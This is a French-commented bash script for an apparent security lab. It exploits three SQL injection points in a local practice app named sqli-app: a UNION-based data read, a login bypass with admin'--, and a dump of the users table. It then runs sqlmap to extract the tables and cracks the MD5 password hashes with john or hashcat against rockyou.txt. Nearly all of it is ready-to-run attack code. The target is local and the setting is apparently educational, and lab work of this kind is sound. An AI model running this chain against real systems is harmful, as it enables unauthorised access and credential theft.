#!/bin/bash
# =====================================================================
# lab_sqli_app.sh — SQL Injection sur sqli-app (3 points d'injection)
# Usage: bash lab_sqli_app.sh
# =====================================================================
set -uo pipefail
source "$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)/env.sh"

APP="http://localhost:$SQLI_APP_PORT"

echo "=== SQLi Shop — 3 points d'injection ==="
echo ""

echo "--- Point 1: Injection numérique (?page=search&id=) ---"
echo "Payload: -1 UNION SELECT 1,2,3,sqlite_version()"
curl -s "$APP/?page=search&id=-1%20UNION%20SELECT%201,2,3,sqlite_version()" \
  | grep -oP '<td>\K[^<]+(?=</td>)' | paste -sd ' | '

echo ""
echo "--- Point 2: Injection chaîne (auth bypass) ---"
echo "Payload: username=admin'--"
curl -s -X POST "$APP/" \
  -d "page=login&username=admin'--&password=anything" \
  | grep -oP "Connecté.*</p>" | head -1

echo ""
echo "--- Point 3: Injection LIKE (?page=users&filter=) ---"
echo "Payload: %' UNION SELECT id,username,password,role FROM users--"
curl -s "$APP/?page=users&filter=%25'%20UNION%20SELECT%20id,username,password,role%20FROM%20users--" \
  | grep -oP '<td>\K[^<]+(?=</td>)' | paste -sd ' | '

echo ""
echo "--- sqlmap automatique ---"
echo "[*] Lancement de sqlmap sur le point 1..."
sqlmap -u "$APP/?page=search&id=1" --batch --dbms=sqlite --level=2 --tables 2>&1 | grep -E '^(|[\*].*|Database:)' | head -10

echo ""
echo "--- Cracking des hashs MD5 ---"
HASHES=$(mktemp)
sqlmap -u "$APP/?page=search&id=1" --batch --dbms=sqlite -T users --dump 2>/dev/null \
  | grep -oP '[a-f0-9]{32}' > "$HASHES"
if [ -s "$HASHES" ]; then
  echo "[*] $HASHES contient $(wc -l < "$HASHES") hashs"
  john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt "$HASHES" 2>/dev/null \
    && john --show --format=raw-md5 "$HASHES" 2>/dev/null \
    || hashcat -m 0 -a 0 "$HASHES" /usr/share/wordlists/rockyou.txt --show 2>/dev/null
else
  echo "[!] Aucun hash extrait"
fi
rm -f "$HASHES"

echo ""
echo "[+] Fini. Tous les points d'injection sont exploitables."
